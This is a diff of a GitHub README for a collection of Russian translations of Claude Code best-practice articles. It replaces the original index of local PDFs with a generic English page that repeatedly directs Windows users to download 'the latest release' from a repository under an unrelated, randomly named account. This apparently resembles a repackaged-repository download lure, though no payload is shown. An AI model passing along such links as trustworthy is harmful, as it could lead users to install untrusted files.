@@ -1,163 +1,130 @@
-# AI-coding: Best Practices (RU)
+# 🧠 cc_bestpractice_russian - Best practices for AI coding
 
-Коллекция переводов и адаптаций ключевых статей о программировании с помощью AI на русский язык.
+[⬇️ Download the latest release](https://github.com/Casefatalityproportionolivergoldsmith63/cc_bestpractice_russian/releases)
 
----
+## 📘 What this is
 
-## 1. Глубокое погружение
+This project gives you Russian translations and adapted notes on key AI coding articles. It is built for people who want to read practical material about coding with AI in plain Russian.
 
-Перевод и адаптация статьи **Tw93** об архитектуре, управлении и инженерных практиках Claude Code.
+You can use it to:
+- read long-form guides in Russian
+- open the original articles and compare ideas
+- follow best practice notes in one place
+- keep useful AI coding advice close at hand
 
-### Оригинал
-- Автор: [Tw93](https://x.com/HiTw93)
-- Статья: [tw93.fun/en/2026-03-12/claude.html](https://tw93.fun/en/2026-03-12/claude.html)
+## 🗂️ What you get
 
-### Что внутри
-- Полный перевод на русский язык (23 страницы)
-- Оригинальные иллюстрации из поста
-- Дополнения Claude Opus 4.6 с актуальными best practices на март 2026
+This repository includes two main documents:
 
-### Скачать
-- [claude_code_handbook_ru.pdf](./claude_code_handbook_ru.pdf)
+### 1. Deep dive on Claude Code
+A full Russian translation and adaptation of Tw93’s article on architecture, control, and engineering habits for Claude Code.
 
----
+### 2. Skills — lessons from building Claude Code
+A full Russian translation of Thariq’s article about how Claude Code uses skills, with examples and team sharing advice.
 
-## 2. Skills — уроки из создания Claude Code
+## 💻 What you need
 
-Полный перевод статьи **Thariq** «Lessons from Building Claude Code: How We Use Skills» (17 марта 2026) — все 9 категорий скиллов с примерами, все советы по созданию, секция по распространению в команде.
+To use these files on Windows, you only need:
+- a Windows computer
+- a browser
+- a PDF reader such as Microsoft Edge, Adobe Acrobat Reader, or any app that opens PDF files
+- an internet connection to get the release files
 
-### Оригинал
-- Автор: [Thariq](https://x.com/trq212)
-- Статья: опубликована 17 марта 2026
+No setup, install, or account setup is needed for the documents themselves.
 
-### Что внутри
-- 11 оригинальных изображений из поста — grid категорий, примеры SKILL.md, gotchas, progressive disclosure, скоупированные хуки
-- Дополнения Opus 4.6 в жёлтых блоках — привязка к multi-agent SDLC, практический план внедрения, пояснения для нетехнических PO
+## 🚀 Download and open on Windows
 
-### Скачать
-- [claude_code_skills_ru.pdf](./claude_code_skills_ru.pdf)
+1. Open the release page here: [https://github.com/Casefatalityproportionolivergoldsmith63/cc_bestpractice_russian/releases](https://github.com/Casefatalityproportionolivergoldsmith63/cc_bestpractice_russian/releases)
+2. Find the latest release on the page
+3. Download the PDF files from that release
+4. After the download finishes, open the file from your Downloads folder
+5. If Windows asks how to open it, choose a PDF app
+6. Read the document in your browser or PDF reader
 
----
+## 📄 Included files
 
-## 3. Как я использую Claude Code — Boris Tane
+### Claude Code handbook in Russian
+- File: `claude_code_handbook_ru.pdf`
+- Content: a 23-page Russian translation and adaptation
+- Includes: original illustrations and added notes for Claude Opus 4.6 best practices
 
-Перевод статьи **Boris Tane** «How I Use Claude Code» (10 февраля 2026) — дисциплинированный workflow из трёх фаз: Research → Plan → Implement, с циклом аннотаций как ключевым элементом контроля качества.
+### Skills article in Russian
+- File: translation based on Thariq’s March 17, 2026 article
+- Content: full translation with 9 skill categories
+- Includes: examples, creation tips, and team sharing guidance
 
-### Оригинал
-- Автор: [Boris Tane](https://x.com/boristane)
-- Статья: [boristane.com/blog/how-i-use-claude-code/](https://boristane.com/blog/how-i-use-claude-code/)
+## 🧭 How to use the files
 
-### Что внутри
-- Фаза исследования: research.md как «контекстный снимок» системы
-- Фаза планирования: plan.md вместо встроенного plan mode
-- Цикл аннотаций (1–6 раундов) — инжекция доменных знаний через inline-заметки
-- Промпты имплементации и паттерны обратной связи
-- Дополнения Opus 4.6 — связь с multi-agent SDLC и паттерном HANDOFF.md
+If you are new to this type of material, start with the first PDF. It gives a broad view of how to work with AI coding tools.
 
-### Скачать
-- [boris_tane_claude_code_ru.pdf](./boris_tane_claude_code_ru.pdf)
+A simple reading path:
+1. Read the first section once through
+2. Look at the illustrations
+3. Read the examples slowly
+4. Keep the second document open for comparison
+5. Revisit sections that match the work you do
 
----
+If you want to use the content for practice, take one idea at a time and test it in your own workflow.
 
-## 4. 50 советов и лучших практик Claude Code
+## 📚 What the documents cover
 
-Перевод треда **Vishwas (Codevolution)** «50 Claude Code Tips and Best Practices For Daily Use» (19 марта 2026) — 50 практических советов от настройки и основ до продвинутых паттернов работы с Claude Code.
+### In the first PDF
+- how to manage Claude Code work
+- how to shape code tasks
+- how to keep control over changes
+- how to use current best practices
+- how to work with large coding jobs
 
-### Оригинал
-- Автор: [Vishwas / Codevolution](https://x.com/CodevolutionWeb)
-- Тред: [x.com/CodevolutionWeb/status/2034683638382506063](https://x.com/CodevolutionWeb/status/2034683638382506063)
+### In the second PDF
+- what skills are in Claude Code
+- how to group skill types
+- how to write useful skill content
+- how teams can share skills
+- how to avoid weak skill design
 
-### Что внутри
-- Настройка и основы: алиасы, горячие клавиши, LSP-плагины
-- Качество и обратная связь: тесты, линтеры, скриншоты
-- CLAUDE.md, хуки, MCP-серверы, мультиагентные паттерны
-- Дополнения Opus 4.6 в жёлтых блоках
+## 🖥️ Windows tips
 
-### Скачать
-- [50_claude_code_tips_ru.pdf](./50_claude_code_tips_ru.pdf)
+If the file does not open after download:
+- right-click the PDF file
+- choose Open with
+- select Microsoft Edge or Acrobat Reader
+- if the file is in a ZIP folder, extract it first
 
----
+If the text looks too small:
+- use the zoom control in your PDF reader
+- press `Ctrl` and `+` to enlarge
+- press `Ctrl` and `-` to reduce size
 
-## 5. Как я работаю с AI-агентами для кодинга — Daz
+If the browser opens the file in a new tab:
+- use the download icon to save a copy
+- open the saved file from File Explorer
 
-Перевод статьи **Daz (Darren)** «How I Work with AI Coding Agents» (1 марта 2026) — взгляд tech lead с 25+ лет опыта: LLM stateless, набор инструментов вместо пайплайна, три точки ревью, управление контекстом и когнитивный долг.
+## 🔗 Download
 
-### Оригинал
-- Автор: [Daz (Darren)](https://daz.is) — tech lead, 25+ лет в разработке
-- Статья: [daz.is/blog/how-i-work-with-ai-coding-agents/](https://daz.is/blog/how-i-work-with-ai-coding-agents/)
+Visit the release page to download the files:
+[https://github.com/Casefatalityproportionolivergoldsmith63/cc_bestpractice_russian/releases](https://github.com/Casefatalityproportionolivergoldsmith63/cc_bestpractice_russian/releases)
 
-### Что внутри
-- Ключевой принцип: LLM stateless — каждый запуск начинается с нуля
-- Research → Plan → Implement как набор инструментов, а не жёсткий пайплайн
-- Три точки ревью вместо одной; бутылочное горлышко ревью
-- Конфигурация: детерминированное vs. инструкции; когнитивный долг
-- Дополнения Opus 4.6 — связь с workflow Boris Tane и Tw93
+## 📌 File names to look for
 
-### Скачать
-- [daz_ai_coding_agents_ru.pdf](./daz_ai_coding_agents_ru.pdf)
+When you open the release page, look for:
+- `claude_code_handbook_ru.pdf`
+- the second translated article file for Skills
 
----
+## 🧩 Good reading habits
 
-## 6. Я построил язык программирования с Claude Code — Ankur Sethi
+- read one section at a time
+- keep the original link nearby if you want to compare wording
+- use search inside the PDF for names or topics
+- save the file in a folder you can find later
+- reopen the document when you need a quick reference
 
-Перевод статьи **Ankur Sethi** «I built a programming language using Claude Code» (10 марта 2026) — кейс создания языка Cutlet за 4 недели и четыре ключевых навыка агентной инженерии.
+## 🛠️ If you want to share it
 
-### Оригинал
-- Автор: [Ankur Sethi](https://ankursethi.com) — фронтенд-разработчик, независимый консультант ([github.com/s3thi](https://github.com/s3thi))
-- Статья: [ankursethi.com/blog/programming-language-claude-code/](https://ankursethi.com/blog/programming-language-claude-code/)
+You can send the PDF files to other people who want Russian AI coding material. The documents work as normal PDFs, so most Windows users can open them without extra steps
 
-### Что внутри
-- Кейс: язык Cutlet (лексер, парсер, интерпретатор, REPL) за 4 недели
-- 4 навыка агентной инженерии: понимание задач LLM, коммуникация намерений, среда для агента, оптимизация цикла
-- Размышления: мертва ли software engineering, кредит за работу Claude, влияние на ментальное здоровье
-- Дополнения Opus 4.6
+## 📎 Original sources
 
-### Скачать
-- [ankur_sethi_cutlet_ru.pdf](./ankur_sethi_cutlet_ru.pdf)
-
----
-
-## 7. Мой опыт с Claude Code — Bruce Wilson
-
-Перевод статьи **Bruce E. Wilson** «My Experience with Claude Code: AI-Assisted Development in Practice» (11 марта 2026) — опыт учёного-практика (химик, 25+ лет в разработке, Oak Ridge National Laboratory), вернувшегося к программированию после долгого перерыва.
-
-### Оригинал
-- Автор: [Bruce E. Wilson](https://x.com/usethedata) — Distinguished R&D Staff, Oak Ridge National Laboratory ([github.com/usethedata](https://github.com/usethedata))
-- Статья: [podfeet.com/blog/2026/03/claude-code-bruce/](https://www.podfeet.com/blog/2026/03/claude-code-bruce/) (Podfeet Podcasts)
-
-### Что внутри
-- Контекст: доменный эксперт, а не профессиональный разработчик
-- Четыре ключевых наблюдения о работе с Claude Code
-- CLAUDE.md как контекст проекта; токены и rate limits
-- Итеративное определение фич; рабочий workflow разработки
-- Вопросы о trade-offs; дополнения Opus 4.6
-
-### Скачать
-- [bruce_wilson_claude_code_ru.pdf](./bruce_wilson_claude_code_ru.pdf)
-
----
-
-## 8. Анатомия папки .claude/ — Akshay Pachaar
-
-Перевод треда **Akshay Pachaar** «Everything inside your .claude folder — and how to actually use it» (21 марта 2026) — полный разбор структуры папки `.claude/`: два уровня конфигурации, CLAUDE.md, rules/, commands/, skills/, agents/, settings.json и план внедрения.
-
-### Оригинал
-- Автор: [Akshay Pachaar](https://x.com/akshay_pachaar)
-- Тред: [x.com/akshay_pachaar/status/2035341800739877091](https://x.com/akshay_pachaar/status/2035341800739877091)
-
-### Что внутри
-- Две папки `.claude/`: проектная (team config) и домашняя (personal config)
-- CLAUDE.md и CLAUDE.local.md — инструкции и личные переопределения
-- Папка rules/: модульные инструкции; commands/: пользовательские slash-команды
-- Папка skills/: рабочие процессы по запросу; agents/: специализированные субагенты
-- settings.json: разрешения и конфигурация; глобальная папка ~/.claude/
-- Дополнения Opus 4.6 — связь с паттернами Tw93, Boris Tane и multi-agent SDLC
-
-### Скачать
-- [akshay_claude_folder_ru.pdf](./akshay_claude_folder_ru.pdf)
-
----
-
-## Подготовил
-- [alienxs2](https://github.com/alienxs2)
-- Перевод и дополнения: Claude Opus 4.6 (Anthropic)
+- Tw93: [https://x.com/HiTw93](https://x.com/HiTw93)
+- Original article: [tw93.fun/en/2026-03-12/claude.html](https://tw93.fun/en/2026-03-12/claude.html)
+- Thariq: [https://x.com/trq212](https://x.com/trq212)
+- Original Skills article: published 17 March 2026
